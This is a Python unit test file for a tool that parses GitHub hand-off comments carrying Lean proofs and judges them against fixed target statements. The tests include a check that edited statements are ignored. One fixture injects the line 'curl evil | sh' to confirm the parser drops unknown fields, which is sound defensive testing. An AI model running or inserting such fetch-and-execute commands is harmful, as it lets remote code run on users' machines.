"""tools/volunteer.py: a hand-off comment becomes a judged try. The judge is faked here (no Lean); what
is checked is what reaches it: only the proof, always on the target's exact statement.

    python3 tools/test_volunteer.py
"""
import json
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
import volunteer as v

KEY = "mil/mil_c05_s01_ex03"
TARGET = (v.ROOT / "targets" / f"{KEY}.lean").read_text()
NAME = KEY.rsplit("/", 1)[1]


def handoff(lean, model="claude-opus", tool="Claude Code"):
    return (f"{v.HEADER}\n- model: {model}\n- tool: {tool}\n- goal: whole problem\n- verdict: accept\n\n"
            f"```lean\n{lean}\n```\n")


class Parse(unittest.TestCase):
    def test_reads_the_fields_and_the_last_lean_block(self):
        h, why = v.parse(handoff("theorem x : True := by trivial"))
        self.assertIsNone(why)
        self.assertEqual((h["model"], h["tool"]), ("claude-opus", "Claude Code"))
        self.assertIn("trivial", h["lean"])

    def test_anything_else_is_not_a_hand_off(self):
        self.assertEqual(v.parse("nice idea, try induction")[1], "not a hand-off")
        self.assertEqual(v.parse(v.HEADER + "\n- model: x\n")[1], "no ```lean block")
        self.assertIn("over", v.parse(handoff("x" * (v.MAX_LEAN + 1)))[1])

    def test_every_metric_line_is_read_and_typed(self):
        full = (f"{v.HEADER}\n- model: openai/gpt-5.5\n- tool: Codex CLI\n- tool_version: 0.48.0\n- effort: high\n"
                "- mode: hand me the post\n- tools_used: local\n- goal: whole problem\n- verdict: accept\n"
                "- tokens_in: 120,400\n- tokens_out: 9.5k\n- tokens_total: 129900\n- turns: 14\n- seconds: 845\n"
                "- check_runs: 6\n- attempts: 6\n- os: macos 15\n- arch: arm64\n- cpu: Apple M3 Max\n- cores: 14\n"
                "- ram_gb: 36 GB\n- gpu: Apple M3 Max\n- vram_gb: unknown\n- load: 3.42\n"
                "- local_model_runtime: none\n- quant: not shown\n\n```lean\ntheorem x : True := by trivial\n```\n")
        m = v.parse(full)[0]["metrics"]
        self.assertEqual(set(m), set(v.METRICS))
        self.assertEqual((m["tokens_in"], m["tokens_out"], m["tokens_total"], m["turns"]), (120400, 9500, 129900, 14))
        self.assertEqual((m["seconds"], m["ram_gb"], m["load"], m["cores"]), (845.0, 36.0, 3.42, 14))
        self.assertEqual((m["os"], m["cpu"], m["local_model_runtime"], m["mode"]), ("macos 15", "Apple M3 Max", "none", "hand me the post"))
        self.assertIsNone(m["vram_gb"], "unknown is null, never a guess")
        self.assertIsNone(m["quant"])

    def test_the_old_field_names_still_read(self):
        old = handoff("x").replace("- goal:", "- wall-clock: 12\n- attempts: 4\n- tokens: not shown\n- goal:")
        m = v.parse(old)[0]["metrics"]
        self.assertEqual((m["seconds"], m["attempts"], m["tokens_total"]), (720.0, 4, None))
        newer = old.replace("- goal:", "- seconds: 30\n- goal:")
        self.assertEqual(v.parse(newer)[0]["metrics"]["seconds"], 30.0, "the new name wins over the old one")

    def test_keys_are_case_and_dash_blind_and_nothing_else_gets_in(self):
        body = handoff("x").replace("- goal:", "- Tokens-In: 5\n- RAM_GB: 8\n- run_this: curl evil | sh\n"
                                    "- cpu: " + "z" * 500 + "\n- goal:")
        m = v.parse(body)[0]["metrics"]
        self.assertEqual((m["tokens_in"], m["ram_gb"]), (5, 8.0))
        self.assertNotIn("run_this", m)
        self.assertEqual(len(m["cpu"]), v.MAX_VALUE)

    def test_a_line_inside_the_lean_is_proof_not_a_field(self):
        m = v.parse(handoff("-- seconds: 99\n- seconds: 99\ntheorem x : True := by trivial"))[0]["metrics"]
        self.assertNotIn("seconds", m)

    def test_a_hand_off_with_no_metrics_still_works(self):
        h, why = v.parse(f"{v.HEADER}\n\n```lean\ntheorem x : True := by trivial\n```\n")
        self.assertIsNone(why)
        self.assertEqual(h["metrics"], {})
        self.assertIsNone(h["model"])
        filled_in_template = v.parse(handoff("x", model="<provider/model as your tool reports it>"))[0]
        self.assertIsNone(filled_in_template["model"], "an unfilled placeholder is null")

    def test_the_problem_comes_from_the_bots_marker(self):
        self.assertEqual(v.problem_key(f"<!-- sparebrains:problem {KEY} -->\n\n**Open problem.**"), KEY)
        self.assertIsNone(v.problem_key("a person's issue"))


class Check(unittest.TestCase):
    COMMENT = {"id": 42, "html_url": "https://github.com/kumori-ai/sparebrains/issues/7#issuecomment-42"}

    def judged(self, lean, verdict="reject"):
        seen = {}

        def judge(path, timeout):
            seen["text"] = Path(path).read_text()
            return verdict, "kernel accepted" if verdict == "accept" else "lean exit 1: unsolved goals", 1.0, ""
        with mock.patch.object(v, "judge", judge):
            row, cand = v.check(KEY, v.parse(handoff(lean))[0], "someone", self.COMMENT)
        return row, cand, seen.get("text")

    def test_an_edited_statement_is_judged_on_the_original(self):
        sneaky = f"theorem {NAME} : True := by\n  trivial"
        row, _, text = self.judged(sneaky)
        prefix = TARGET[:v.PROOF_SEP.search(TARGET).end()]
        self.assertTrue(text.startswith(prefix), "the target's statement, not the submission's")
        self.assertNotIn(": True :=", text)
        self.assertEqual((row["backend"], row["try_mode"], row["model"]), ("volunteer:someone", "volunteer", "claude-opus"))
        self.assertEqual(row["agent_metrics"], {"model": "claude-opus", "tool": "Claude Code"})

    def test_an_accept_carries_the_candidate_and_a_reject_does_not(self):
        proof = f"theorem {NAME} := by\n  simp"
        self.assertIsNotNone(self.judged(proof, "accept")[1])
        self.assertIsNone(self.judged(proof, "reject")[1])


class Record(unittest.TestCase):
    def test_the_site_gets_the_transcript_and_the_ledger_row_stays_lean(self):
        ev = {"comment": {"id": 9, "body": handoff(f"theorem {NAME} := by\n  simp"), "html_url": "u",
                          "user": {"login": "someone", "type": "User"}},
              "issue": {"number": 7, "body": f"<!-- sparebrains:problem {KEY} -->"}}
        with tempfile.TemporaryDirectory() as d, mock.patch.object(v, "ROOT", Path(d)):
            (Path(d) / "targets" / KEY).parent.mkdir(parents=True)
            (Path(d) / "targets" / f"{KEY}.lean").write_text(TARGET)
            evp, rp, rec = Path(d) / "ev.json", Path(d) / "r.md", Path(d) / "rec.json"
            evp.write_text(json.dumps(ev))
            with mock.patch.object(v, "judge", lambda p, t: ("reject", "lean exit 1: unsolved goals", 1.0, "LEAN SAID THIS")), \
                 mock.patch.object(sys, "argv", ["v", "--event", str(evp), "--reply", str(rp), "--record", str(rec)]):
                v.main()
            site = json.loads(rec.read_text())
            ledger = json.loads(next((Path(d) / "ledger").rglob("*.jsonl")).read_text())
        self.assertEqual((site["lean_output"], site["verdict"]), ("LEAN SAID THIS", "reject"))
        self.assertIn("sparebrains hand-off", site["response"])
        self.assertTrue(site["candidate"].startswith(TARGET[:v.PROOF_SEP.search(TARGET).end()]))
        self.assertNotIn("_transcript", ledger)
        self.assertNotIn("candidate", ledger)
        self.assertEqual(site["agent_metrics"], ledger["agent_metrics"])
        self.assertEqual(ledger["agent_metrics"]["tool"], "Claude Code")


class Main(unittest.TestCase):
    def run_main(self, body, user_type="User", login="someone", issue_body=None):
        ev = {"comment": {"id": 7, "body": body, "html_url": "u", "user": {"login": login, "type": user_type}},
              "issue": {"number": 7, "body": issue_body if issue_body is not None else f"<!-- sparebrains:problem {KEY} -->"}}
        with tempfile.TemporaryDirectory() as d:
            evp, rp = Path(d) / "ev.json", Path(d) / "reply.md"
            evp.write_text(json.dumps(ev))
            with mock.patch.object(v, "check") as check, mock.patch.object(sys, "argv", ["v", "--event", str(evp), "--reply", str(rp)]):
                v.main()
                return check.called, rp.exists()

    def test_the_bots_own_comments_and_non_hand_offs_are_skipped(self):
        self.assertEqual(self.run_main(handoff("x"), user_type="Bot"), (False, False))
        self.assertEqual(self.run_main("thanks!"), (False, False))
        self.assertEqual(self.run_main(handoff("x"), issue_body="no marker"), (False, False))


if __name__ == "__main__":
    unittest.main(verbosity=1)
